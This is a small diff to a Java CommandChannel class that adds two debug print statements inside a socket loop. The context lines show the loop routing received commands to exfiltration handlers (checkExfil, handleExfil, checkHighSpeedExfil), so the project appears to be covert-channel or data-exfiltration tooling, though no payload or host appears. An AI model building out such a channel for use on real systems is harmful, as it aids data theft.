@@ -44,7 +44,9 @@ public class CommandChannel implements Runnable{
 							s.getOutputStream().flush();
 							command += inStr;
 							inStr = decodeResponse(readAll(s));
+							System.out.println("[D] inStr="+inStr);
 						}
+						System.out.println("[D] Processing Response");
 						if(ech.checkExfil(command)){
 							System.out.println(ech.handleExfil(command,msus));
 						}else if (ech.checkHighSpeedExfil(command)){
